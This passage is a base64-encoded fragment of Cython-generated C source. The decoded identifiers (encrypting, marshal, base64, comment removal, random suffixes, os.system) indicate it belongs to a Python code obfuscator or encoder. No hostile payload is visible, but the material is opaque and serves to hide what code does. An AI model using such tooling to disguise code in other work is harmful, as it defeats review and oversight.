l6ZW9mKF9fcHl4X2tfKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa18wbSwgc2l6ZW9mKF9fcHl4X2tfMG0pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzFfOTJtXzM4XzVfNDhtQURESU5HX0NZVEhPTl9MQVksIHNpemVvZihfX3B5eF9rXzFfOTJtXzM4XzVfNDhtQURESU5HX0NZVEhPTl9MQVkpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rXzFfOTJtXzM4XzVfNDltRU5DUllQVElORywgc2l6ZW9mKF9fcHl4X2tfMV85Mm1fMzhfNV80OW1FTkNSWVBUSU5HKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19GYWlsZWRfY3l0aG9uX2Vycm9yLCBzaXplb2YoX19weXhfa19GYWlsZWRfY3l0aG9uX2Vycm9yKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19USElTX0VOQ09ERV9CWV9QUkVFVF9CZWFzdGVyZW4xLCBzaXplb2YoX19weXhfa19USElTX0VOQ09ERV9CWV9QUkVFVF9CZWFzdGVyZW4xKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19fMiwgc2l6ZW9mKF9fcHl4X2tfXzIpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX18zLCBzaXplb2YoX19weXhfa19fMyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfXzQsIHNpemVvZihfX3B5eF9rX180KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19fNSwgc2l6ZW9mKF9fcHl4X2tfXzUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX182LCBzaXplb2YoX19weXhfa19fNiksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYV8yLCBzaXplb2YoX19weXhfa19hXzIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2FhLCBzaXplb2YoX19weXhfa19hYSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYXNjaWlfbG93ZXJjYXNlLCBzaXplb2YoX19weXhfa19hc2NpaV9sb3dlcmNhc2UpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2FzY2lpX3VwcGVyY2FzZSwgc2l6ZW9mKF9fcHl4X2tfYXNjaWlfdXBwZXJjYXNlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19hc3luY2lvX2Nvcm91dGluZXMsIHNpemVvZihfX3B5eF9rX2FzeW5jaW9fY29yb3V0aW5lcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYXV0b3BlcDgsIHNpemVvZihfX3B5eF9rX2F1dG9wZXA4KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19iYXNlNjQsIHNpemVvZihfX3B5eF9rX2Jhc2U2NCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYywgc2l6ZW9mKF9fcHl4X2tfYyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfY2hhcmFjdGVycywgc2l6ZW9mKF9fcHl4X2tfY2hhcmFjdGVycyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY2hvaWNlLCBzaXplb2YoX19weXhfa19jaG9pY2UpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2NsYXNzX2dldGl0ZW0sIHNpemVvZihfX3B5eF9rX2NsYXNzX2dldGl0ZW0pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2NsZWFyLCBzaXplb2YoX19weXhfa19jbGVhciksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY2xpbmVfaW5fdHJhY2ViYWNrLCBzaXplb2YoX19weXhfa19jbGluZV9pbl90cmFjZWJhY2spLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2Nsb3NlLCBzaXplb2YoX19weXhfa19jbG9zZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY29udGVudCwgc2l6ZW9mKF9fcHl4X2tfY29udGVudCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY3l0aG9uX20sIHNpemVvZihfX3B5eF9rX2N5dGhvbl9tKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19kYXRldGltZSwgc2l6ZW9mKF9fcHl4X2tfZGF0ZXRpbWUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2RpZ2l0cywgc2l6ZW9mKF9fcHl4X2tfZGlnaXRzKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19kaXNhYmxlLCBzaXplb2YoX19weXhfa19kaXNhYmxlKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19lbmFibGUsIHNpemVvZihfX3B5eF9rX2VuYWJsZSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfZW5jb2RpbmcsIHNpemVvZihfX3B5eF9rX2VuY29kaW5nKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19lbnRlciwgc2l6ZW9mKF9fcHl4X2tfZW50ZXIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2V4aXQsIHNpemVvZihfX3B5eF9rX2V4aXQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2V4aXRfMiwgc2l6ZW9mKF9fcHl4X2tfZXhpdF8yKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19mLCBzaXplb2YoX19weXhfa19mKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19maXhfY29kZSwgc2l6ZW9mKF9fcHl4X2tfZml4X2NvZGUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2Z1bmMsIHNpemVvZihfX3B5eF9rX2Z1bmMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2csIHNpemVvZihfX3B5eF9rX2cpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2djLCBzaXplb2YoX19weXhfa19nYyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeCwgc2l6ZW9mKF9fcHl4X2tfZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeF9sb2NhbHNfZ2UsIHNpemVvZihfX3B5eF9rX2dlbmVyYXRlX3JhbmRvbV9zdWZmaXhfbG9jYWxzX2dlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19nZW5leHByLCBzaXplb2YoX19weXhfa19nZW5leHByKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19ndywgc2l6ZW9mKF9fcHl4X2tfZ3cpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2d3X2xvY2Fsc19nZW5leHByLCBzaXplb2YoX19weXhfa19nd19sb2NhbHNfZ2VuZXhwciksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaSwgc2l6ZW9mKF9fcHl4X2tfaSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaW5fY29tbWVudCwgc2l6ZW9mKF9fcHl4X2tfaW5fY29tbWVudCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaW5pdGlhbGl6aW5nLCBzaXplb2YoX19weXhfa19pbml0aWFsaXppbmcpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lucHV0X2YsIHNpemVvZihfX3B5eF9rX2lucHV0X2YpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lucHV0X2ZpbGUsIHNpemVvZihfX3B5eF9rX2lucHV0X2ZpbGUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lzX2Nvcm91dGluZSwgc2l6ZW9mKF9fcHl4X2tfaXNfY29yb3V0aW5lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pc2VuYWJsZWQsIHNpemVvZihfX3B5eF9rX2lzZW5hYmxlZCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfbGVuZ3RoLCBzaXplb2YoX19weXhfa19sZW5ndGgpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2xldHRlcnMsIHNpemVvZihfX3B5eF9rX2xldHRlcnMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX20sIHNpemVvZihfX3B5eF9rX20pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX21fbnFfcHksIHNpemVvZihfX3B5eF9rX21fbnFfcHkpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX21haW4sIHNpemVvZihfX3B5eF9rX21haW4pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX21hcnNoYWwsIHNpemVvZihfX3B5eF9rX21hcnNoYWwpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX21vZHVsZSwgc2l6ZW9mKF9fcHl4X2tfbW9kdWxlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19uYW1lLCBzaXplb2YoX19weXhfa19uYW1lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19uYW1lMiwgc2l6ZW9mKF9fcHl4X2tfbmFtZTIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX25hbWUyX2Jhc2UsIHNpemVvZihfX3B5eF9rX25hbWUyX2Jhc2UpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX25hbWVfMiwgc2l6ZW9mKF9fcHl4X2tfbmFtZV8yKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19uZXh0LCBzaXplb2YoX19weXhfa19uZXh0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19ucSwgc2l6ZW9mKF9fcHl4X2tfbnEpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX29wZW4sIHNpemVvZihfX3B5eF9rX29wZW4pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX29zLCBzaXplb2YoX19weXhfa19vcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfb3V0cHV0X2NvbnRlbnQsIHNpemVvZihfX3B5eF9rX291dHB1dF9jb250ZW50KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19vdXRwdXRfZiwgc2l6ZW9mKF9fcHl4X2tfb3V0cHV0X2YpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX291dHB1dF9maWxlLCBzaXplb2YoX19weXhfa19vdXRwdXRfZmlsZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcG9wLCBzaXplb2YoX19weXhfa19wb3ApLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3ByaW50LCBzaXplb2YoX19weXhfa19wcmludCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcHksIHNpemVvZihfX3B5eF9rX3B5KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19xdWFsbmFtZSwgc2l6ZW9mKF9fcHl4X2tfcXVhbG5hbWUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3IsIHNpemVvZihfX3B5eF9rX3IpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JhbmRpbnQsIHNpemVvZihfX3B5eF9rX3JhbmRpbnQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JhbmRvbSwgc2l6ZW9mKF9fcHl4X2tfcmFuZG9tKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yYW5nZSwgc2l6ZW9mKF9fcHl4X2tfcmFuZ2UpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlYWQsIHNpemVvZihfX3B5eF9rX3JlYWQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlbW92ZSwgc2l6ZW9mKF9fcHl4X2tfcmVtb3ZlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yZW1vdmVfY29tbWVudHMsIHNpemVvZihfX3B5eF9rX3JlbW92ZV9jb21tZW50cyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmVwbGFjZSwgc2l6ZW9mKF9fcHl4X2tfcmVwbGFjZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc2VuZCwgc2l6ZW9mKF9fcHl4X2tfc2VuZCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc2V0X25hbWUsIHNpemVvZihfX3B5eF9rX3NldF9uYW1lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zaHV0aWwsIHNpemVvZihfX3B5eF9rX3NodXRpbCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc3BlYywgc2l6ZW9mKF9fcHl4X2tfc3BlYyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc3RyaW5nLCBzaXplb2YoX19weXhfa19zdHJpbmcpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3N5c3RlbSwgc2l6ZW9mKF9fcHl4X2tfc3lzdGVtKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190ZXN0LCBzaXplb2YoX19weXhfa190ZXN0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190aHJvdywgc2l6ZW9mKF9fcHl4X2tfdGhyb3cpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3V0Zl84LCBzaXplb2YoX19weXhfa191dGZfOCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfdmFsdWUsIHNpemVvZihfX3B5eF9rX3ZhbHVlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa193LCBzaXplb2YoX19weXhfa193KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa193cml0ZSwgc2l6ZW9mKF9fcHl4X2tfd3JpdGUpLCAwLCAxLCAxfSwgXG4gIHswLCAwLCAwLCAwLCAwfVxufTtcblxuc3RhdGljIGludCBfX1B5eF9Jbml0U3RyaW5ncyhfX1B5eF9TdHJpbmdUYWJFbnRyeSBjb25zdCAqdCwgUHlPYmplY3QgKip0YXJnZXQsIGNvbnN0IGNoYXIqIGNvbnN0KiBlbmNvZGluZ19uYW1lcyk7XG5cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRDYWNoZWRCdWlsdGlucyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19weXhfYnVpbHRpbl9yYW5nZSA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JhbmdlKTsgaWYgKCFfX3B5eF9idWlsdGluX3JhbmdlKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9idWlsdGluX29wZW4gPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9vcGVuKTsgaWYgKCFfX3B5eF9idWlsdGluX29wZW4pIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X2J1aWx0aW5fcHJpbnQgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wcmludCk7IGlmICghX19weXhfYnVpbHRpbl9wcmludCkgX19QWVhfRVJSKDAsIDU2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfYnVpbHRpbl9leGl0ID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZXhpdCk7IGlmICghX19weXhfYnVpbHRpbl9leGl0KSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKVxuICByZXR1cm4gMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICByZXR1cm4gLTE7XG59XG5cblxuc3RhdGljIGludCBfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfSW5pdENhY2hlZENvbnN0YW50cyIsIDApO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSkpIF9fUFlYX0VSUigwLCAxNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSA9IFB5VHVwbGVfUGFjaygzLCBQeV9Ob25lLCBQeV9Ob25lLCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSkpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3B5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2MpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzJdKSkgX19QWVhfRVJSKDAsIDcwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzJdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcHksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVszXSkpIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVszXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSA9IFB5VHVwbGVfUGFjaygxLCAoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTApKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSkpIF9fUFlYX0VSUigwLCAxMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNF0pO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAtMTtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fcHl4X21zdGF0ZS0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9wb3AudHlwZSA9IChQeU9iamVjdCopJlB5RGljdF9UeXBlO1xuICBfX3B5eF9tc3RhdGUtPl9fcHl4X3VtZXRob2RfUHlEaWN0X1R5cGVfcG9wLm1ldGhvZF9uYW1lID0gJl9fcHl4X21zdGF0ZS0+X19weXhfbl91X3BvcDtcbiAgaWYgKF9fUHl4X0luaXRTdHJpbmdzKF9fcHl4X3N0cmluZ190YWIsIF9fcHl4X21zdGF0ZS0+X19weXhfc3RyaW5nX3RhYiwgX19weXhfc3RyaW5nX3RhYl9lbmNvZGluZ3MpIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKTtcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMCA9IFB5TG9uZ19Gcm9tTG9uZygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8wKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xID0gUHlMb25nX0Zyb21Mb25nKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIgPSBQeUxvbmdfRnJvbUxvbmcoMik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNCA9IFB5TG9uZ19Gcm9tTG9uZyg0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF80KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMCA9IFB5TG9uZ19Gcm9tTG9uZygxMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIHJldHVybiAwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIHJldHVybiAtMTtcbn1cblxudHlwZWRlZiBzdHJ1Y3Qge1xuICAgIHVuc2lnbmVkIGludCBhcmdjb3VudCA6IDI7XG4gICAgdW5zaWduZWQgaW50IG51bV9wb3Nvbmx5X2FyZ3MgOiAxO1xuICAgIHVuc2lnbmVkIGludCBudW1fa3dvbmx5X2FyZ3MgOiAxO1xuICAgIHVuc2lnbmVkIGludCBubG9jYWxzIDogNDtcbiAgICB1bnNpZ25lZCBpbnQgZmxhZ3MgOiAxMDtcbiAgICB1bnNpZ25lZCBpbnQgZmlyc3RfbGluZSA6IDY7XG4gICAgdW5zaWduZWQgaW50IGxpbmVfdGFibGVfbGVuZ3RoIDogMTM7XG59IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb247XG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlDb2RlX05ldyhcbiAgICAgICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjcixcbiAgICAgICAgUHlPYmplY3QgKiBjb25zdCAqdmFybmFtZXMsXG4gICAgICAgIFB5T2JqZWN0ICpmaWxlbmFtZSxcbiAgICAgICAgUHlPYmplY3QgKmZ1bmNuYW1lLFxuICAgICAgICBjb25zdCBjaGFyICpsaW5lX3RhYmxlLFxuICAgICAgICBQeU9iamVjdCAqdHVwbGVfZGVkdXBfbWFwXG4pO1xuXG5cbnN0YXRpYyBpbnQgX19QeXhfQ3JlYXRlQ29kZU9iamVjdHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIFB5T2JqZWN0KiB0dXBsZV9kZWR1cF9tYXAgPSBQeURpY3RfTmV3KCk7XG4gIGlmICh1bmxpa2VseSghdHVwbGVfZGVkdXBfbWFwKSkgcmV0dXJuIC0xO1xuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX0dFTkVSQVRPUiksIDE2LCAyfTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9fNn07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fbnFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X2tfYSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDEsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFN8Q09fR0VORVJBVE9SKSwgMjEsIDJ9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X182fTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9ucV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa19fNywgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxXSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDQsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAxMywgMzB9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2xlbmd0aCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfY2hhcmFjdGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwcn07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMl0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fbnFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmVyYXRlX3JhbmRvbV9zdWZmaXgsIF9fcHl4X2tfMV8yVV9hLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzJdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgNCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDE5LCAyMH07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbGVuZ3RoLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9sZXR0ZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlszXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9ucV9w